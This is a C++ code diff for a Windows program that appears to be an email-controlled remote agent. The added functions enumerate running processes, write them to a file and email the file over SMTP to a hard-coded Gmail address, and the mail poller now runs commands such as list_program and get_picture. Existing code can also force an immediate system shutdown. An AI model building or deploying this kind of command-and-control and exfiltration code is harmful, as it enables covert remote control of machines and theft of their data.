@@ -69,6 +69,96 @@ string base64_decode(const string& encoded_data) {
   return ss.str();
 }
 
+void list_programs() {
+  const string filename = "process_list.txt";
+  ofstream outFile(filename);
+  if (!outFile) {
+    cerr << "Failed to create output file." << endl;
+    return;
+  }
+
+  HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+  if (hSnapshot == INVALID_HANDLE_VALUE) {
+    cerr << "Failed to create process snapshot." << endl;
+    return;
+  }
+
+  PROCESSENTRY32 pe32;
+  pe32.dwSize = sizeof(PROCESSENTRY32);
+
+  outFile << "=== Running Processes ===" << endl;
+  if (Process32First(hSnapshot, &pe32)) {
+    do {
+      // Convert WCHAR to std::string (ASCII-safe)
+      string processName;
+      for (int i = 0; pe32.szExeFile[i] != '\0'; ++i) {
+        processName += static_cast<char>(pe32.szExeFile[i]);
+      }
+
+      outFile << "- " << processName << " (PID: " << pe32.th32ProcessID << ")" << endl;
+
+    } while (Process32Next(hSnapshot, &pe32));
+  } else {
+    outFile << "Failed to retrieve process list." << endl;
+  }
+
+  CloseHandle(hSnapshot);
+  outFile << "==========================" << endl;
+  outFile.close();
+
+  cout << "Process list written to: " << filename << endl;
+}
+
+void send_email_with_attachment(const string& toEmail, const string& subject, const string& body, const string& filepath) {
+  CURL* curl = curl_easy_init();
+  if (!curl) {
+    cerr << "Failed to initialize curl" << endl;
+    return;
+  }
+
+  struct curl_slist* recipients = nullptr;
+  curl_mime* mime;
+  curl_mimepart* part;
+
+  curl_easy_setopt(curl, CURLOPT_USERNAME, gmail_username.c_str());
+  curl_easy_setopt(curl, CURLOPT_PASSWORD, app_password.c_str());
+  curl_easy_setopt(curl, CURLOPT_URL, "smtps://smtp.gmail.com:465");
+
+  curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
+  curl_easy_setopt(curl, CURLOPT_CAINFO, ca_bundle_path.c_str());
+
+  curl_easy_setopt(curl, CURLOPT_MAIL_FROM, ("<" + gmail_username + ">").c_str());
+
+  recipients = curl_slist_append(recipients, ("<" + toEmail + ">").c_str());
+  curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
+
+  mime = curl_mime_init(curl);
+
+  // Body part
+  part = curl_mime_addpart(mime);
+  curl_mime_data(part, body.c_str(), CURL_ZERO_TERMINATED);
+
+  // Attachment part
+  part = curl_mime_addpart(mime);
+  curl_mime_filedata(part, filepath.c_str());
+  curl_mime_filename(part, "process_list.txt");
+
+  curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
+  curl_easy_setopt(curl, CURLOPT_MAIL_AUTH, gmail_username.c_str());
+  curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
+
+  CURLcode res = curl_easy_perform(curl);
+  if (res != CURLE_OK)
+    cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << endl;
+  else
+    cout << "Email with attachment sent successfully!" << endl;
+
+  curl_mime_free(mime);
+  curl_slist_free_all(recipients);
+  curl_easy_cleanup(curl);
+}
+
+
 void shutdown_program(const string& process_name) {
   HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
   if (hSnapshot == INVALID_HANDLE_VALUE) {
@@ -139,7 +229,21 @@ void execute_command(const string& command) {
     if (!proc.empty()) {
       shutdown_program(proc);
     }
-  } else if (trimmed_cmd.find("shutdown") == 0) {
+  } else if (trimmed_cmd.find("list_program") == 0) {
+  list_programs();
+  Sleep(1000);
+ifstream test_file("process_list.txt");
+if (test_file.good()) {
+    test_file.close();
+    send_email_with_attachment("serverbottestmmt@gmail.com",
+                                "Running Process List",
+                                "Attached is the current process list.",
+                                "process_list.txt");
+} else {
+    cerr << "Failed to create process list file" << endl;
+}
+}
+ else if (trimmed_cmd.find("shutdown") == 0) {
     cout << "Initiating system shutdown..." << endl;
     if (system("shutdown /s /t 0") != 0) {
       cerr << "Shutdown command failed" << endl;
@@ -289,7 +393,9 @@ void check_email_commands() {
       cout << line << '\n';
       if (line.find("start_program") != string::npos ||
           line.find("shutdown") != string::npos ||
-          line.find("COMMAND") != string::npos) {
+          line.find("COMMAND") != string::npos ||
+          line.find("list_program") != string::npos ||
+          line.find("get_picture") != string::npos) {
         execute_command(line);
       }
     }
